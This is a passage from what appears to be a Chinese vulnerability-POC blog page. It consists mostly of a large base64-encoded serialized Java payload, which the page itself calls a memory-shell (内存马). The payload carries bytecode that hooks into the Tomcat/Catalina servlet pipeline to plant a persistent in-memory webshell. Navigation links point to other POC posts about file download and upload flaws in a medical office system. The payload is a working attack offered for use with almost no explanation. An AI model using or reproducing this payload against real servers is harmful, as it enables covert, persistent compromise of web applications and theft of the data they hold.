dDsBABJbTGphdmEvbGFuZy9DbGFzczsHAbYBABNbTGphdmEvbGFuZy9PYmplY3Q7BwG4DAGyAbMKAAIBugEAEWdldFNlcnZsZXRDb250ZXh0CAG8DAG0AbUKAAIBvgoANAAKAQADYWRkDAHBAF4KADQBwgEACWdldFBhcmVudAgBxAEAC2dldFBpcGVsaW5lCAHGAQAIZ2V0Rmlyc3QIAcgBAAxnZXRDb25kaXRpb24IAcoBAAxzZXRDb25kaXRpb24IAcwBAAhXaGF0ZXZlcggBzgEADHNldEF0dHJpYnV0ZQgB0AEAB2dldE5leHQIAdIBABlvcmcuYXBhY2hlLmNhdGFsaW5hLlZhbHZlCAHUAQA9KExqYXZhL2xhbmcvU3RyaW5nO1pMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylMamF2YS9sYW5nL0NsYXNzOwwA5AHWCgBJAdcBABBpc0Fzc2lnbmFibGVGcm9tAQAUKExqYXZhL2xhbmcvQ2xhc3M7KVoMAdkB2goASQHbAQAJL3Rlc3QuY3NzCAHdACEAAgAEAAEABgABAAkBYgFjAAAACwABAAcACAABAAkAAAARAAEAAQAAAAUqtwALsQAAAAAAAQAMAA0AAgAJAAAADQAAAAIAAAABsQAAAAAADgAAAAQAAQAQAAEAEQASAAIACQAAA3gABgAbAAACTSvAABw6BCzAAB46BRkEOgYZBToHGQQTADe5ADsCABMAPbYAQZkCIBkGwQBDmgA0EwBFEwBHAbYATToIGQgZBAG2AFE6BqcAGBkGwQBDmQAGpwAQGQgZBgG2AFE6Bqf/</span>6xkHwQBTmgA0EwBVEwBXAbYATToJGQkZBQG2AFE6B6cAGBkHwQBTmQAGpwAQGQkZBwG2AFE6B6f<span class="hljs-regexp">/6xkEuQBaAQATAFy2AGCZAZ67ACJZtwBhOgoZBsAAQ7YAZToLGQoTAGcZBrYAa1cZChMAbRkHtgBrVxkKEwBvGQu2AGtXuwAmWRkEuQBzAQC2AHi3AHs6DBkMAaUADBkMtgB/</span><span class="hljs-type">A6AAqLsAJlm3AIA6DBkGEwBnuACEwAAoOg0ZDRMAhrgAhMAAKjoOGQ62AIo6DxkPEwCMuACEwAAuOhAZELYAkLkAlgEAOhGnAFgZEbkAmgEAOhIZErkAnwEAtgCiEwCkEwCmtgCqOhMZErkArQEAwAA0OhQZFLYAsAOgAA4ZDBkTtgC0V6cAGhkMGRO2ALQTALa2ALQZFAO2ALq2AL1XGRG5AMEBAJr</span><span class="hljs-regexp">/pCoZBrYAxRMAxzoVGQsTAMkZFbkAzQMAEwDPuADVOhYZFgW7ANdZGRW2ANsTAM+3AN62AOETAOO4AOcTAOkGvQBJWQMS61NZBLIA8VNZBbIA8VO2APQ6FxkXBLYA+hkWGQy2APu4AP+2AQM6GBkXuAEJtgENBr0ABFkDGRhTWQQDuAERU1kFGRi+uAERU7YAUcAASToZGRm2ARQZCrYBFVenAAg6GqcAA7EAAQAUAkQCRwAUAAEANQAAAREAEP8ASAAJBwACBwAWBwAYBwAaBwAcBwAeBwAEBwAeBwAgAAAKCfoAAv8AIAAKBwACBwAWBwAYBwAaBwAcBwAeBwAEBwAEAAcAIAAACgn5AAL/</span><span class="hljs-type">AGUADQcAAgcAFgcAGAcAGgcAHAcAHgcABAcABAAABwAiBwAkBwAmAAD</span><span class="hljs-regexp">/AEUAEgcAAgcAFgcAGAcAGgcAHAcAHgcABAcABAAABwAiBwAkBwAmBwAoBwAqBwAsBwAuBwAwAAD+AD0HAAQHADIHADT4ABb/</span><span class="hljs-type">AAkADQcAAgcAFgcAGAcAGgcAHAcAHgcABAcABAAABwAiBwAkBwAmAAD</span><span class="hljs-regexp">/AJ8ACAcAAgcAFgcAGAcAGgcAHAcAHgcABAcABAAAQgcAFAQADgAAAAYAAgEXABAAAQEYAAgAAQAJAAAADQAAAAEAAAABsQAAAAAACAEZAAgAAQAJAAABqQAFAAsAAAFAEwHeswFluAEjuAEmS7gBCbYBDcABG0wrtgEquQEwAQDAAR1NpwA/</span><span class="hljs-type">Tiu2ATS2ATcTATm2AT06BBkEBLYBQBkEK7YBQzoFGQW2ATQTAUW2AT06BhkGBLYBQBkGGQW2AUPAAR1NAU4stgE0tgE3Ti0TAUe2AT1XpwASOgQstgE0Ti0TAUe2AT1XLRMBR7YBPToEGQQEtgFAGQQstgFDwAFJOgW7AAJZtwFKOga7AUxZtwFNOgcZBxkGtgFRGQcqtgFUGQcZBrYBNLYBV7YBWiwZB7YBXrsBYFm3AWE6CBkIsgFltgFoGQgqtgFpGQiyAW</span><span class="hljs-operator">+</span>2AXK2AXUsGQi2AXkTAXsFvQBJWQMTAX1TWQQTAUxTtgGBOgkZCQS2AYQZCQW9AARZAyxTWQQZB1O2AYfAAXs6ChkFKhkKuQGIAwBXpwAES7EAAwAXACQAJwAUAGUAdQB4ABQABgE7AT4AFAABADUAAAA<span class="hljs-regexp">/AAb/</span><span class="hljs-type">ACcAAgcAMgcBGwABBwAU</span><span class="hljs-regexp">/AA7BwEd/</span>wAUAAQHADIHARsHAR0HAEkAAQcAFA7<span class="hljs-regexp">/ALYAAAABBwAU/</span><span class="hljs-type">AAABwAEAAkA</span><span class="hljs-regexp">/AD9AAIACQAAAMwABgAHAAAAfgFNEwGKuADnTCsTAYwBtgBNKwG2AFFOLbYBNBMBjgS9AElZAxIyU7YATS0EvQAEWQMqU7YAUcAA602nAEI6BBMBkLgA50wrtgEUOgUZBbYBNBMBkgS9AElZAxIyU7YATRkFBL0ABFkDKlO2AFHAAOtNpwAIOganAAOnAAMssAACAAIAOgA9ABQAPwBxAHQAFAABADUAAAAsAAT/</span><span class="hljs-type">AD0AAwcAMgAHAOsAAQcAFP8ANgAFBwAyAAcA6wAHABQAAQcAFAT5AAIADgAAAAQAAQAUAAkAgQCCAAIACQAAAHkAAgAFAAAAPgFNKsEBP5kACyrAAT9NpwAlKrYBNE6nABgtK7YBPU0BTqcADToELbYBN06nAAMtAab</span><span class="hljs-regexp">/6SwEtgD6LCq2AUOwAAEAGQAhACQAFAABADUAAAAhAAX8ABEF/</span>wAHAAQHAAQHADIHAT8HAEkAAEoHABQJ<span class="hljs-operator">+</span>gAEAA4AAAAEAAEAFAAJAZMBlAABAAkAAAD3AAIACgAAAKkBS7sBmlm3AZu2AZ8EMrYBpLgA57YBpwGmAAe4AalLpwAHTKcAAyoBpgAoEwGruADnTSwTAa22AT1OLQS2APotAbYBQ8ABmEunAAg6BKcAAyoBpgAtEwGvuADnOgUZBRMBsbYBPToGGQYEtgD6GQYBtgFDwAGYS6cACDoHpwADKgGmACYTAZgTAa22AT06CBkIBLYA<span class="hljs-operator">+</span>hkIAbYBQ8ABmEunAAg6CacAAyqwAAQAAgAfACIBlgArAEgASwAUAFUAdwB6ABQAhACfAKIAFAABADUAAAAcAAn8AB8HAZhCBwGWA2QHABQEaQcAFARiBwAUBAAJAbIBswABAAkAAABOAAMABQAAACcBTqcAHiorLLYA9E4tBLYA<span class="hljs-operator">+</span>gFLpwANOgQqtgE3S6cAAyoBpv<span class="hljs-regexp">/jLbAAAQAFABMAFgAUAAEANQAAAA0AA/</span>wABQcAIFAHABQJAAkBtAG1AAEACQAAAFwAAwAGAAAAIyq2ATQrLLgBuzoEGQQBpQALGQQqLbYAUbCnAAg6BacAAwGwAAEAAAAZABwAFAABADUAAAAfAAP8ABkHACD<span class="hljs-regexp">/AAIABAcABAcAMgcBtwcBuQABBwAUBAABAMIAwwABAAkAAAHMAAgACwAAAU0rEwG9AQG4Ab8TAUW4AIRNLBMBRbgAhE67ADRZtwHAOgSnABQZBC22AcNXLRMBxQEBuAG/</span><span class="hljs-type">Ti0Bpv</span><span class="hljs-regexp">/tAzYFFQUZBLYAsKIBABkEFQW2ALoTAccBAbgBvzoGGQYBpQDbGQYTAckBAbgBvzoHpwDGGQe2ATQTAcsBuAG7AaUAGxkHtgE0EwHNBL0ASVkDEjJTuAG7AaYABqcAcBkHEwHLAQG4Ab/</span><span class="hljs-type">AADI6CBkIAaYACRMBz6cABRkIOggZBxMBzQS9AElZAxIyUwS9AARZAxkIU7gBv1crEwHRBb0ASVkDEjJTWQQSBFMFvQAEWQMZCFNZBBkIU7gBv1cZBxMB0wEBuAG</span><span class="hljs-regexp">/OgenAC4TAdUDLLYBNLYBp7gB2BkHtgE0tgHcmQASGQcTAdMBAbgBvzoHpwAGAToHGQcBpv86pwAIOgmnAAOEBQGn/</span>vynAAg6CqcAA7EAAgBHATYBOQAUAAABRAFHABQAAQA1AAAAXQAR<span class="hljs-regexp">/gAkBwAEBwAEBwA0EPwABwH9AC8HAAQHAAQnAvwAGgcAMkEHADL6AE8nAvoABf8AAgAGBwACBwAEBwAEBwAEBwA0AQABBwAUBAX/</span><span class="hljs-type">AAIAAgcAAgcABAABBwAUBAAAdXEAfgAQAAABGsr</span><span class="hljs-operator">+</span>ur4AAAAzABEBADdvcmcvYXBhY2hlL2NvbW1vbnMvZWxlbWVudC9mYWNlbGV0cy9GYWNlbGV0VmFsaWRhdG9yVGFnBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABhGYWNlbGV0VmFsaWRhdG9yVGFnLmphdmEBABBzZXJpYWxWZXJzaW9uVUlEAQABSgVx5mnuPG1HGAEADUNvbnN0YW50VmFsdWUBAAY8aW5pdD4BAAMoKVYMAAwADQoABAAOAQAEQ29kZQAhAAIABAAAAAEAGgAHAAgAAQALAAAAAgAJAAEAAQAMAA0AAQAQAAAAEQABAAEAAAAFKrcAD7EAAAAAAAEABQAAAAIABnB0AAhVWk9FUVZUQnB3AQB4cQB<span class="hljs-operator">+</span><span class="hljs-type">AA14</span>&lt;@/d_base64&gt;</span><br></code></pre></td></tr></table></figure>
+<p>&lt;@d_base64&gt;参数中 base64编码为内存马payload</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/" class="category-chain-item">漏洞知识库</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/1970/01/01/POC/%E4%B8%9C%E5%8D%8E%E5%8C%BB%E7%96%97%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9FtemplateFile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" title="东华医疗协同办公系统templateFile存在任意文件下载漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">东华医疗协同办公系统templateFile存在任意文件下载漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/1970/01/01/POC/%E4%B8%9C%E5%8D%8E%E5%8C%BB%E7%96%97%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="东华医疗协同办公系统文件上传">
+                        <span class="hidden-mobile">东华医疗协同办公系统文件上传</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
